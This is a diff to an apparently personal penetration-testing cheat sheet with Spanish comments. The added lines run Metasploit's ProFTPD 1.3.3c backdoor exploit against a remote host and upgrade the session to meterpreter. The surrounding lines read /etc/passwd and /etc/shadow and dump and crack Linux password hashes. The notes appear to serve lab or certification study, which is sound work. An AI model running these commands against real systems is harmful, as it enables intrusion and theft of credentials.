@@ -1099,11 +1099,18 @@ cat /etc/passwd
 sudo cat /etc/shadow
 
 # METASPLOIT (once exploited)
+use exploit/unix/ftp/proftpd_133c_backdoor
+set rhosts <rhost>
+exploit
+hacemos background cntl+Z y sessions
+sessions -u <numero_de_sesion>  ---> si falla, le damos de nuevo a sessions y miramos la sesion meterpreter
+
+
 use post/linux/gather/hashdump
 set SESSION <NUMBER>
 
 use auxiliary/analyze/crack_linux
-set SHA512 true
+set SHA512 true  ------> despues de esto esperar a que se rompa el hash
 ```
 
 ## Network Based Attacks
